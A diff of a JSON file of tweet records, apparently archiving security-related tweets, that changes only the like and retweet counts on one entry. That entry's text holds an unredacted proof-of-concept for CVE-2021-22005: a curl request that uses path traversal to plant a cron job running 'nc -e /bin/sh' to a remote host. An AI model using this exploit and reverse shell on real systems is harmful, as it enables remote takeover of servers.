@@ -71,10 +71,10 @@
     "username": "wdormann"
 }
 {
-    "tweetfavorites": 861,
+    "tweetfavorites": 862,
     "tweetquotes": 17,
     "tweetreplies": 5,
-    "tweetretweets": 392,
+    "tweetretweets": 391,
     "tweettext": "CVE-2021-22005: Exploitation in the wild confirmed. Unredacted RCE PoC against CEIP below.\n\ncurl -kv \"https://172.16.57.2/analytics/telemetry/ph/api/hyper/send?_c=&amp;_i=/../../../../../../etc/cron.d/$RANDOM\" -H Content-Type: -d \"* * * * * root nc -e /bin/sh 172.16.57.1 4444\" https://t.co/bwjMA21ifA",
     "tweettime": "2021-09-27, 23:36:14",
     "tweeturl": "https://twitter.com/wvuuuuuuuuuuuuu/status/1442634215330390020",
